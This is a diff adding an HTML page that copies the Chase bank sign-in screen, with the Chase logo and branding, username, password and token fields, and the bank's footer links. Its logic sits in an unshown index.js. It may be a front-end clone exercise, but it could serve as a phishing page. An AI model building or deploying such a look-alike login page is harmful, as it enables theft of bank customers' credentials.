@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/73be9fb684.js" crossorigin="anonymous"></script>
+    <link rel="icon" href="images/1000193120-removebg-preview.png" type="image/png">
+    <title>Sign in - chase.com</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="logingbody" id="login-page">
+    <div class="loginformcontainer">
+        <img src="images/innerlogo_chase_wht.webp" alt="chase" class="headerimg">
+        <div class="formcover">
+            <div class="formcontainer">
+                <div class="usernamecon inputcon">
+                    <label for="username" class="usernameinp fontchnge" id="namelabel">Username</label>
+                    <input type="text" id="username" class="usernamefilde impact">
+                    <div id="showwrongusername" class="wrongshow"><span class="wronginput"><i class="fa-solid fa-circle-exclamation loginexcla"></i><p class="wronglabele">Enter your username.</p></span></div>
+                </div>
+                <div class="passwrdcon inputcon">
+                    <label for="password" class="passwordinp fontchnge" id="passwordlabel">Password</label>
+                    <span class="password-show" id="passwordspan">
+                        <input type="password" id="password" class="passwordfilde impact">
+                        <button id="showpass" class="passhow">Show</button>
+                    </span>
+                    <div id="showwrongpassword" class="wrongshow"><span class="wronginput"><i class="fa-solid fa-circle-exclamation loginexcla"></i><p class="wronglabele">Enter your Password.</p></span></div>
+                </div>
+                <div class="tokencon inputcon" id="tokenconid">
+                    <label for="token" class="tokeninp fontchnge" id="tokenlabel">Token</label>
+                    <input type="text" id="token" class="tokenfilde impact">
+                    <div id="showwrongtoken" class="wrongshow"><span class="wronginput"><i class="fa-solid fa-circle-exclamation loginexcla"></i><p class="wronglabele">Enter your Token.</p></span></div>
+                </div>
+            </div>
+            <div class="checkshold">
+                <div class="remembermehold">
+                    <input type="checkbox" class="checkboxrem" id="remember">
+                    <label for="remember" class="checklabel">Remember me</label>
+                </div>
+                <div class="tokenhold">
+                    <input type="checkbox" class="checkboxtoken" id="usetoken">
+                    <label for="usetoken" class="checklabel">Use token</label>
+                </div>
+            </div>
+            <button id="signin" class="signinbutton">Sign in</button>
+            <div class="forgot-enrolle-signup">
+                <span class="forgotinfo">
+                    <!-- forgot password -->
+                    <button id="forgot" class="butonlogincard">Forgot username/password?</button>
+                    <i class="fa-solid fa-chevron-right"></i>
+                </span>
+                <span class="enrolleinfo">
+                    <!-- enrolled or sign up -->
+                    <button id="enrolle"  class="butonlogincard">Not enrolled? Sign up now. </button>
+                    <i class="fa-solid fa-chevron-right"></i>
+                </span>
+            </div>
+        </div>
+    </div>
+    <div class="footerlogincontaner">
+        <div class="socialmediaicons">
+            <i class="fa-brands fa-square-facebook footericons"></i>
+            <i class="fa-brands fa-instagram footericons"></i>
+            <i class="fa-brands fa-x-twitter footericons"></i>
+            <i class="fa-brands fa-youtube  footericons"></i>
+            <i class="fa-brands fa-linkedin footericons"></i>
+        </div>
+        <div class="fotlinks">
+            <a href="" class="links">Contact us</a>
+            <a href="" class="links">Privacy & security</a>
+            <a href="" class="links">Terms of use</a>
+            <a href="" class="links">Accessibility</a>
+            <a href="" class="links">SAFE Act: Chase Mortgage Loan Originators</a>
+            <a href="" class="links">Fair Lending</a>
+            <a href="" class="links">About Chase</a>
+            <a href="" class="links">J.P. Morgan</a>
+            <a href="" class="links">JPMorgan Chase & Co.</a>
+            <a href="" class="links">Careers</a>
+            <a href="" class="links">Español</a>
+            <a href="" class="links">Chase Canada</a>
+            <a href="" class="links">Site map</a>
+            <a href="" class="links Member">Member FDIC</a>
+            <a href="" class="links Member">
+                <span class="EqualHousing">
+                    <i class="fa-solid fa-house"></i>
+                    Equal Housing Opportunity</span>
+            </a>
+        </div>
+        <div class="jpdate">
+            <a href="" class="jb2025"><p>© 2025 JPMorganChase</p></a>
+        </div>
+    </div>
+
+    <script src="index.js" type="module"></script>
+</body>
+</html>
